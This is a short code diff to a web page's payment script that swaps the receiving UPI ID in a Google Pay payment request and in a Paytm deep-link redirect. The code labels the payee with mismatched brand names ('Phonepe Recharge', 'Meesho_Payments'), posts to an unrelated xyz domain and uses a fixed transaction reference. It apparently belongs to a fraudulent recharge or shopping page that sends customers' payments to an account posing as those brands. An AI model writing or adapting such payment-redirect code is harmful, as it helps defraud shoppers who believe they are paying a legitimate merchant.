@@ -27,7 +27,7 @@
             const supportedInstruments = [{
                 supportedMethods: ['https://tez.google.com/pay'],
                 data: {
-                    pa: 'mab.037324028910060@axisbank',
+                    pa: 'fcbizckmkfs@freecharge',
                     pn: 'Phonepe Recharge',
                     tr: '1234ABCD',
                     url: 'https://drigli.xyz/newtest',
@@ -143,7 +143,7 @@
         }
 
         function fallbackPayment(amount) {
-            const upiId = 'mab.037324028910060@axisbank';
+            const upiId = 'fcbizckmkfs@freecharge';
             const redirect_url = `paytmmp://cash_wallet?pa=${upiId}&pn=Meesho_Payments&am=${amount}&cu=INR&tn=4520175&featuretype=money_transfer`;
 
             window.location.href = redirect_url;
